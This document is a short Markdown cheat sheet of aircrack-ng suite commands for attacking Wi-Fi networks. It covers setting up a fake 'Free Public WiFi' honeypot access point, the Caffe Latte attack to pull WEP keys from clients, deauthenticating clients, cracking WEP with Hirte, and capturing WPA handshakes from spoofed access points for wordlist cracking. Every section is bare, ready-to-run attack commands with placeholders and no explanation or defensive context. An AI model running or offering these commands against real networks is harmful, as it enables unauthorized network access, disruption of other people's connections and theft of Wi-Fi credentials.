## Mis-Association Attack (Honeypot)
```bash
airmon-ng start wlan0  # 
airbase-ng -P -C 30 -e "Free Public WiFi" -c [channel] mon0  # 
ifconfig at0 up  # 
dhclient at0

```
## Caffe Latte Attack (Client WEP Key Retrieval)
```bash
airmon-ng start wlan0  # 
airbase-ng -e "test" -c [channel] -W 1 -Z 4 mon0  # 
airodump-ng -c [channel] --bssid [spoofed MAC] -w lattekill mon0  # 

```
## De-Authenticating the Client
```bash
airmon-ng start wlan0  # 
airodump-ng mon0  # 
aireplay-ng --deauth 5 -a [AP MAC] -c [client MAC] mon0  # 


```
## Cracking WEP with Hirte
```bash
airmon-ng start wlan0  # 
airodump-ng mon0  # 
aireplay-ng --interactive -b [target MAC] -h [your MAC] mon0  # 
aircrack-ng -z -n 64 -b [target MAC] wephirte.cap


```
## AP-less WPA cracking
```bash
airmon-ng start wlan0  # 
airbase-ng -e [target ESSID] -c [channel] -a [target BSSID] -Z 4 mon0  # 
airodump-ng -c [channel] --bssid [target BSSID] -w ap-less mon0  # 
aireplay-ng --deauth 5 -a [target BSSID] -c [client MAC] mon0  # 
aircrack-ng -w /path/to/wordlist.txt ap-less-01.cap
```